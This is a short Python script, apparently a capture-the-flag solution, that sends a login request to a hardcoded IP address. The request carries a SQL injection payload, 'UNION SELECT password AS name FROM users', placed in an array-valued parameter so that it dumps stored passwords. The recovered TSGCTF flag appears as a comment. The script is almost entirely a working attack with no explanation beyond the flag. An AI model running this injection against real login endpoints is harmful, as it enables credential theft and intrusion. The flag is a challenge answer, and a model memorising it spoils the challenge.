#web library 
import requests

url = "http://35.221.67.248:10501/actions/login"

def solve():
    params = {
        "name": [
            "' UNION SELECT password AS name FROM users --",
            "dummy_to_force_array"
        ],
        "password": "anything"
    }

    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            print(response.text)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    solve()

#FLAG: TSGCTF{s4m3_m3th0d_n4m3_d1ff3r3nt_cl4ss_b3h4v10r}